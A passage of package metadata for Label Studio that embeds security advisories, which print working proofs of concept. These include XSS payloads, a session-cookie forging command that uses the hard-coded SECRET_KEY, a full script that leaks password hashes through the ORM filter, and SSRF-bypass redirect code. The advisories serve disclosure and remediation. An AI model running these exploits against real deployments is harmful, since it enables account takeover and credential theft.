following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.9.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.9.0/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","click (~=7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (>=1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (>=1.13.0)","srsly (>=0.2.0)","tqdm (>=4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.22)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)","Colorama (==0.4.4)","boxing (==0.1.4)","pyyaml (>=5.3.1)"],"requires_python":">=3.5, <3.9","summary":"Label Studio annotation tool","version":"0.9.0","yanked":true,"yanked_reason":"This version can't work on some systems"},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"521746d2327840bed6895a7d2bf058c5725b17d92ae0417d340d8bf0b2a8d629","md5":"aabee2d9393da9ec77a5b731bafa1986","sha256":"a79296af8b8f4e470b768bcd1063f3a448fdc9e91e6dfaa18c650fa2818de622"},"downloads":-1,"filename":"label_studio-0.9.0-5-py3-none-any.whl","has_sig":false,"md5_digest":"aabee2d9393da9ec77a5b731bafa1986","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5, <3.9","size":18875081,"upload_time":"2021-01-18T12:48:45","upload_time_iso_8601":"2021-01-18T12:48:45.785697Z","url":"https://files.pythonhosted.org/packages/52/17/46d2327840bed6895a7d2bf058c5725b17d92ae0417d340d8bf0b2a8d629/label_studio-0.9.0-5-py3-none-any.whl","yanked":true,"yanked_reason":"This version can't work on some systems"},{"comment_text":"","digests":{"blake2b_256":"0465c7a4188918ac0071c818cf776919fc97d8c3535eb796c19f56543bf739ea","md5":"0e3752297cabc9c9b869e7e20d5b1ff1","sha256":"b5e7ba0d3bb73338e4b3f4eef33443bf558b38379707e199984590729796e94f"},"downloads":-1,"filename":"label-studio-0.9.0-5.tar.gz","has_sig":false,"md5_digest":"0e3752297cabc9c9b869e7e20d5b1ff1","packagetype":"sdist","python_version":"source","requires_python":">=3.5, <3.9","size":18707003,"upload_time":"2021-01-18T12:49:01","upload_time_iso_8601":"2021-01-18T12:49:01.244142Z","url":"https://files.pythonhosted.org/packages/04/65/c7a4188918ac0071c818cf776919fc97d8c3535eb796c19f56543bf739ea/label-studio-0.9.0-5.tar.gz","yanked":true,"yanked_reason":"This version can't work on some systems"}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain 